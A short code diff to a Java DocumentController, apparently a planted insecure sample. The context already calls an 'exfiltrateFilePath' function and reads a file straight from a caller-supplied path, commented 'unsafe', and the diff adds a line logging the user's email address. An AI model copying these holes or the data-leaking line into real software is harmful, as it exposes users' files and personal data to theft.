@@ -19,7 +19,8 @@ public class DocumentController {
         try {
             // Exfiltrate file path
             exfiltrateFilePath(filePath);
-
+            
+            Logging.info("Users email is: " + email);
             // Read file content (unsafe)
             String content = new String(Files.readAllBytes(Paths.get(filePath)));
             return content;
